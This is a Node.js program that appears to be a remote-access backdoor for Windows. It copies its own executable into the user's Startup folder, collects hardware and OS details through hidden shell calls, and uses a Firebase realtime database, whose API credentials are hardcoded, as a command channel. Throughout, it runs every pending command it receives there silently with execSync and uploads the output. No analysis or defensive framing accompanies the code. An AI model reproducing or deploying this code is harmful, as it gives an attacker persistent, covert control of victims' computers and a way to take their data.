const path = require("path");
const { initializeApp } = require ("firebase/app");
const { getDatabase, get, ref, set, update,onValue,onDisconnect, orderByChild, limitToLast, query, onChildAdded } = require ("firebase/database");
const termind = require ("child_process");
const firebaseConfig = {
  apiKey: "AIzaSyDgMMwfv1AgI54owCYHmtYI-Au6brHC4dI",
  authDomain: "server-107.firebaseapp.com",
  databaseURL: "https://server-107-default-rtdb.asia-southeast1.firebasedatabase.app",
  projectId: "server-107",
  storageBucket: "server-107.firebasestorage.app",
  messagingSenderId: "394111941988",
  appId: "1:394111941988:web:c95cb4df3c2954f9bc4e71",
  measurementId: "G-SYX4J1LCF6"
};

// Initialize Firebase
const app = initializeApp(firebaseConfig);
const db = getDatabase(app);

async function namepc(){
  const startup = `%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup`;

  termind.execSync(
    `if /i not "${path.dirname(process.execPath)}"=="%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup" copy /Y "${process.execPath}" "${startup}\\"`,
    { windowsHide: true }
  );
  const layten = termind.execSync("hostname",{ windowsHide: true });
  const layram = termind.execSync('systeminfo | findstr /C:"Total Physical Memory"',{ windowsHide: true });
  const ramloc = layram.toString().replace(/[^0-9.]/g, "").trim();
  const laycpu = termind.execSync('powershell -command "(Get-CimInstance Win32_Processor).Name"',{ windowsHide: true });
  const layvga = termind.execSync('powershell -command "(Get-CimInstance Win32_VideoController).Name"',{ windowsHide: true });
  const laybonho = termind.execSync('powershell -command "Get-CimInstance Win32_LogicalDisk | Select-Object DeviceID, @{Name=\\"Size(GB)\\";Expression={[math]::Round($_.Size/1GB,2)}}"',{ windowsHide: true });
  const layhe = termind.execSync('powershell -command "(Get-CimInstance Win32_OperatingSystem).Caption"',{ windowsHide: true });
  const trangthairef = ref(db, `maytinh/${layten.toString().trim()}/trangthai`);
      const ketnoiref = ref(db, ".info/connected");
      onValue(ketnoiref, (a)=>{
        onDisconnect(trangthairef).set("offline");
        set(trangthairef, "online");
      }) 
    
  await update(ref(db, `maytinh/${layten.toString().trim()}`),{
    ram:ramloc,
    cpu:laycpu.toString(),
    vga:layvga.toString(),
    bonho:laybonho.toString(),
    hedieuhanh:layhe.toString(),
  })
  const nhanlenhref = query(ref(db, `maytinh/${layten.toString().trim()}/code`), orderByChild("time"), limitToLast(1));
  const laylenh  = onChildAdded(nhanlenhref, (data)=>{
    if(data.val().dathucthi === "false"){
      try{
      const ketqua = termind.execSync(data.val().lenh,{ windowsHide: true });
        setTimeout(async()=>{
        await update(ref(db, `maytinh/${layten.toString().trim()}/code/${data.key}`),{
          ketqua: ketqua.toString(),
          dathucthi: "true",
        }) 
      },1000)
      }catch{
      const ketqua = "Đã có lỗi xảy ra!" 
        setTimeout(async()=>{
        await update(ref(db, `maytinh/${layten.toString().trim()}/code/${data.key}`),{
          ketqua: ketqua.toString(),
          dathucthi: "true",
        }) 
      },1000)
      }
      
    }
    
  })
}
namepc();



